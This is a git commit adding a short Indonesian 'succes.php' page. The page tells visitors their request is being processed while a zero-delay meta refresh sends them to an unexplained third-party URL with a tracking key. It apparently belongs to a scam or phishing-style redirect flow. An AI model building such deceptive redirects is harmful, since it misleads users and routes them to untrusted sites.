43ea1e8380ef4773dc66e46ce4716ade4c65356e
Bigvana <82066545+Bigvana@users.noreply.github.com>
2024-03-20 08:33:50 +0700

    Add files via upload

---
+++ succes.php
@@ -0,0 +1,17 @@
+<html>
+<head>
+<meta http-equiv="REFRESH" content="0;url=https://winewiden.com/xf2y3jue3?key=725646f7cd6c41593a3fd212cf9bc4e0"></pre>
+<title>Redirect dengan tag meta</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link href="css/f_h1NZqvg5HEtHijgWC9ooa14ggIOeVaVs_1585706428_lpf.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width">
+  <pre>
+  </head>
+<body>
+  <center>
+  <font size="5"><strong>
+Sedang memproses permintaan anda......!<strong/></font><br><center/>
+<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglFLN98prJoU1fcNKe1rjKzF5C3P70vuBJHjRxCXpo_s97zrBlTESdIjPMt9ejO8b4PM2Tii9Nbz1NM1Jmg67VTSq0znoJ1EfT6SNUmc-Bwm-tx4thhOmNydHdUl8tW0L8z4jB6RfzJJ2pfM3XCzE_6SvQFVTvZ_kyZ1TJkao3-swuxv9gF1gaRGtp1RA/s495/IMG_20231027_193822.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="371" data-original-width="495" height="240" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglFLN98prJoU1fcNKe1rjKzF5C3P70vuBJHjRxCXpo_s97zrBlTESdIjPMt9ejO8b4PM2Tii9Nbz1NM1Jmg67VTSq0znoJ1EfT6SNUmc-Bwm-tx4thhOmNydHdUl8tW0L8z4jB6RfzJJ2pfM3XCzE_6SvQFVTvZ_kyZ1TJkao3-swuxv9gF1gaRGtp1RA/s320/IMG_20231027_193822.jpg" width="320" /></a></div><br />&nbsp;<p></p>
+</body>
+</html>
